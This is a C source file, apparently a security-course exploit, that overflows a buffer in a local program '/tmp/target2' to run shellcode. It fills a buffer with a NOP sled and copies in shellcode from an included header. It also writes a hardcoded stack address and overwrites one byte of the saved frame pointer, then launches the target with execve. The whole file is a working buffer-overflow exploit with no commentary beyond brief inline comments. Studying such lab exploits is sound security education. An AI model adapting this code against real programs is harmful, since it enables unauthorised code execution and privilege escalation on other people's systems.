#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  int buffersize = 161;
  int i, j;
  char buffer[buffersize];

  for (i = 0; i < (156 - 45); i++)
      buffer[i] = 0x90; //NOPS

  strcpy(buffer + 160 - 45-4, shellcode); // put the shellc string in the end of the buffer

  long* tmp = (long*)(buffer + 156);
  *tmp = 0xbffffd28; // shellcode address
  buffer[160] = 0xc0; //ebp -> shellcode add
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
